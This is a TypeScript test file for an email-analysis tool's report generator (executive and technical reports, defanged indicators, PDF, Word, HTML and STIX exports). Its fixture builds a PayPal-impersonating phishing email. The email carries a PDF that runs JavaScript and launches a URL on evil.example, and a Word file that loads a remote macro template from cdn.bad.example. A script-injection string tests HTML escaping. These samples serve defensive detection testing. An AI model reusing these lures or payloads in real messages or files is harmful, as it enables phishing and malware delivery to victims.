import { analyzeRawEmail } from '../src/core/analyze';
import { buildCaseReport, buildReportFile, docText, renderDocx, renderHtml, renderPdf, buildStixBundle, stixPattern, collectIocs } from '../src/report';
import { zipEntries, zipRead } from '../src/lib/binary';
import { fixture, makeZip } from './helpers';

const enc = (s: string) => new TextEncoder().encode(s);
const latin = (b: Uint8Array) => Array.from(b, (c) => String.fromCharCode(c)).join('');
const NOW = new Date('2026-11-07T10:00:00Z');

async function phishWithFiles() {
  const pdf = enc(`%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 5 0 R >> endobj\n2 0 obj << /Type /Pages /Kids [3 0 R] /Count 1 >> endobj\n3 0 obj << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >> endobj\n5 0 obj << /S /JavaScript /JS (eval(unescape("%u9090")); app.launchURL("https://evil.example/pay")) >> endobj\ntrailer << /Root 1 0 R >>\n%%EOF\n`);
  const docx = await makeZip([
    { name: '[Content_Types].xml', data: enc('<Types/>') },
    { name: 'word/document.xml', data: enc('<w:document><w:t>Enable editing to view this document</w:t></w:document>') },
    { name: 'word/_rels/settings.xml.rels', data: enc('<Relationships><Relationship Id="r1" Type="http://x/attachedTemplate" Target="https://cdn.bad.example/t.dotm" TargetMode="External"/></Relationships>') },
  ]);
  const b64 = (u: Uint8Array) => Buffer.from(u).toString('base64');
  const raw = [
    'From: "PayPal Service" <billing@paypa1-support.xyz>',
    'To: victim@example.org',
    'Subject: Your account has been limited',
    'Date: Mon, 19 Oct 2026 16:00:00 +0000',
    'Message-ID: <abc@paypa1-support.xyz>',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="b"',
    '',
    '--b',
    'Content-Type: text/html; charset=utf-8',
    '',
    '<p>Sign in at <a href="https://paypa1-secure.top/login">paypal.com</a></p>',
    '--b',
    'Content-Type: application/pdf; name="invoice.pdf"',
    'Content-Disposition: attachment; filename="invoice.pdf"',
    'Content-Transfer-Encoding: base64',
    '',
    b64(pdf),
    '--b',
    'Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document; name="form.docx"',
    'Content-Disposition: attachment; filename="form.docx"',
    'Content-Transfer-Encoding: base64',
    '',
    b64(docx),
    '--b--',
    '',
  ].join('\r\n');
  return analyzeRawEmail(raw);
}

describe('investigation report model', () => {
  it('has an executive part for leaders and a detailed technical part', async () => {
    const r = await phishWithFiles();
    const doc = buildCaseReport(r, { version: '9.9.9', now: NOW });
    const parts = new Set(doc.sections.map((s) => s.part));
    expect(parts).toEqual(new Set(['executive', 'technical', 'appendix']));
    const ids = doc.sections.map((s) => s.id);
    expect(ids).toEqual(expect.arrayContaining(['summary', 'what-happened', 'business-impact', 'actions', 'notify', 'confidence', 'case', 'verdict', 'authentication', 'links', 'attachments', 'iocs', 'detection', 'response', 'method', 'appendix-findings', 'appendix-headers']));
    expect(doc.verdict.tone).toBe('bad');
    expect(doc.meta[0]![1]).toMatch(/^UNM-20261107-[0-9A-F]{8}$/);
  });

  it('keeps the executive part in plain language, with no jargon tables', async () => {
    const text = docText(buildCaseReport(await phishWithFiles(), { version: '1', now: NOW, audience: 'executive' }));
    expect(text).toMatch(/This email looks like a scam/);
    expect(text).toMatch(/Stolen passwords|Malware or ransomware/);
    expect(text).not.toMatch(/SHA-256|DKIM|Received:/);
    expect(text).toMatch(/Who to tell/);
  });

  it('puts file forensics, ATT&CK and indicators in the technical part', async () => {
    const text = docText(buildCaseReport(await phishWithFiles(), { version: '1', now: NOW, audience: 'technical' }));
    expect(text).toMatch(/PDF structure \(pdfid-style keyword counts\)/);
    expect(text).toMatch(/PDF contains JavaScript/);
    expect(text).toMatch(/Loads a template from the internet/);
    expect(text).toMatch(/T1059\.007/);
    expect(text).toMatch(/Indicators of compromise/);
    expect(text).toMatch(/Microsoft Defender/);
    expect(text).not.toMatch(/Who to tell/);
  });

  it('defangs every indicator it prints', async () => {
    const r = await phishWithFiles();
    const text = docText(buildCaseReport(r, { version: '1', now: NOW, audience: 'technical' }));
    const iocSection = text.slice(text.indexOf('Indicators of compromise'), text.indexOf('Detection and hunting'));
    expect(iocSection).toContain('hxxps://paypa1-secure[.]top/login');
    expect(iocSection).not.toMatch(/https?:\/\//);
    expect(iocSection).not.toContain('billing@paypa1-support.xyz');
  });

  it('records the original message hash when the caller has it', async () => {
    const doc = buildCaseReport(await phishWithFiles(), { version: '1', now: NOW, evidence: { emlSha256: 'ab'.repeat(32), emlSize: 1234 } });
    expect(docText(doc)).toContain('ab'.repeat(32));
  });

  it('exports exact, never defanged, indicator values', async () => {
    const iocs = collectIocs(await phishWithFiles());
    expect(iocs).toEqual(expect.arrayContaining([{ type: 'sender', value: 'billing@paypa1-support.xyz' }, { type: 'url', value: 'https://paypa1-secure.top/login' }]));
  });
});

describe('formats', () => {
  it('HTML escapes everything and loads nothing', async () => {
    const r = await phishWithFiles();
    r.email.subject = '<script>alert(1)</script> & "quotes"';
    const html = renderHtml(buildCaseReport(r, { version: '1', now: NOW }));
    expect(html).not.toContain('<script');
    expect(html).toContain('&lt;script&gt;alert(1)&lt;/script&gt; &amp; &quot;quotes&quot;');
    expect(html).toContain("default-src 'none'");
    expect(html).not.toMatch(/<(img|link|iframe|object)\b/i);
    expect(html).toContain('Part A: Executive summary');
    expect(html).toContain('Part B: Technical analysis');
  });

  it('PDF is structurally valid, has a contents page with page numbers and stays Latin-1', async () => {
    const r = await phishWithFiles();
    r.email.subject = 'Rechnung → “日本” 請求';
    const pdf = latin(renderPdf(buildCaseReport(r, { version: '1', now: NOW })));
    expect(pdf.startsWith('%PDF-1.4')).toBe(true);
    expect(pdf.trimEnd().endsWith('%%EOF')).toBe(true);
    const xrefAt = Number(pdf.match(/startxref\n(\d+)/)![1]);
    const entries = pdf.slice(xrefAt).split('\n').slice(3).filter((l) => / n $/.test(l));
    entries.forEach((e, i) => expect(pdf.slice(Number(e.slice(0, 10)), Number(e.slice(0, 10)) + 12)).toMatch(new RegExp(`^${i + 1} 0 obj`)));
    expect(Number(pdf.match(/\/Count (\d+)/)![1])).toBeGreaterThan(5);
    expect(pdf).toContain('Contents');
    expect(pdf).toContain('Unmask email report');
    expect(pdf).toMatch(/Page 2 of \d+/);
    // Every character outside Latin-1 became "?".
    expect([...pdf].every((c) => c.charCodeAt(0) < 256)).toBe(true);
  });

  it('Word file is a valid package with real headings, tables and a footer', async () => {
    const r = await phishWithFiles();
    const bytes = renderDocx(buildCaseReport(r, { version: '1', now: NOW }));
    const entries = zipEntries(bytes);
    expect(entries.map((e) => e.name)).toEqual(expect.arrayContaining(['[Content_Types].xml', '_rels/.rels', 'word/document.xml', 'word/styles.xml', 'word/footer1.xml', 'word/_rels/document.xml.rels']));
    const read = async (n: string) => new TextDecoder().decode((await zipRead(bytes, entries.find((e) => e.name === n)!))!);
    for (const e of entries) {
      const xml = await read(e.name);
      // Well-formed: every opened tag is closed.
      const stack: string[] = [];
      for (const m of xml.replace(/<\?[\s\S]*?\?>/g, '').matchAll(/<(\/?)([\w:.-]+)[^>]*?(\/?)>/g)) {
        if (m[3]) continue;
        if (m[1]) expect(stack.pop()).toBe(m[2]);
        else stack.push(m[2]!);
      }
      expect(stack, e.name).toEqual([]);
    }
    const doc = await read('word/document.xml');
    expect(doc).toContain('w:pStyle w:val="Heading1"');
    expect(doc).toContain('<w:tblHeader/>');
    expect(doc).toContain('PDF contains JavaScript');
    expect(doc).toContain('Part B: Technical analysis');
    expect(await read('word/footer1.xml')).toContain('PAGE');
  });

  it('STIX bundle carries exact indicators, ATT&CK patterns and a TLP marking', async () => {
    const r = await phishWithFiles();
    const doc = buildCaseReport(r, { version: '1', now: NOW, meta: { tlp: 'GREEN' } });
    const bundle = (await buildStixBundle(r, doc, NOW)) as { type: string; id: string; objects: Record<string, unknown>[] };
    expect(bundle.type).toBe('bundle');
    const byType = (t: string) => bundle.objects.filter((o) => o.type === t);
    expect(byType('identity')).toHaveLength(1);
    expect(byType('report')).toHaveLength(1);
    expect(byType('report')[0]).toMatchObject({ object_marking_refs: ['marking-definition--34098fce-860f-48ae-8e50-ebd3cc5e41da'], report_types: ['threat-report'] });
    const patterns = byType('indicator').map((o) => o.pattern);
    expect(patterns).toContain("[url:value = 'https://paypa1-secure.top/login']");
    expect(patterns).toContain("[email-addr:value = 'billing@paypa1-support.xyz']");
    expect(patterns.some((p) => String(p).startsWith("[file:hashes.'SHA-256' = "))).toBe(true);
    expect(byType('attack-pattern').map((o) => (o.external_references as { external_id: string }[])[0]!.external_id)).toContain('T1059.007');
    // Every id is unique and references resolve.
    const ids = bundle.objects.map((o) => o.id as string);
    expect(new Set(ids).size).toBe(ids.length);
    const refs = (byType('report')[0] as { object_refs: string[] }).object_refs;
    refs.forEach((id) => expect(ids).toContain(id));
    // Deterministic: the same report gives the same ids.
    const again = (await buildStixBundle(r, doc, NOW)) as typeof bundle;
    expect(again.objects.filter((o) => o.type === 'indicator').map((o) => o.id)).toEqual(byType('indicator').map((o) => o.id));
  });

  it('STIX exports no indicators for a clear email', async () => {
    const r = await analyzeRawEmail(fixture('legit-newsletter.eml'));
    expect(r.verdict).toBe('clear');
    const bundle = (await buildStixBundle(r, buildCaseReport(r, { version: '1', now: NOW }), NOW)) as { objects: { type: string }[] };
    expect(bundle.objects.filter((o) => o.type === 'indicator')).toHaveLength(0);
  });

  it('escapes quotes and backslashes in STIX patterns', () => {
    expect(stixPattern({ type: 'url', value: "https://a.example/it's\\x" })).toBe("[url:value = 'https://a.example/it\\'s\\\\x']");
  });

  it('builds each format through one entry point', async () => {
    const r = await phishWithFiles();
    for (const fmt of ['pdf', 'docx', 'html', 'stix'] as const) {
      const f = await buildReportFile(r, fmt, { version: '1', now: NOW });
      expect(f.ext).toBeTruthy();
      expect((f.data as Uint8Array | string).length).toBeGreaterThan(500);
    }
  });
});
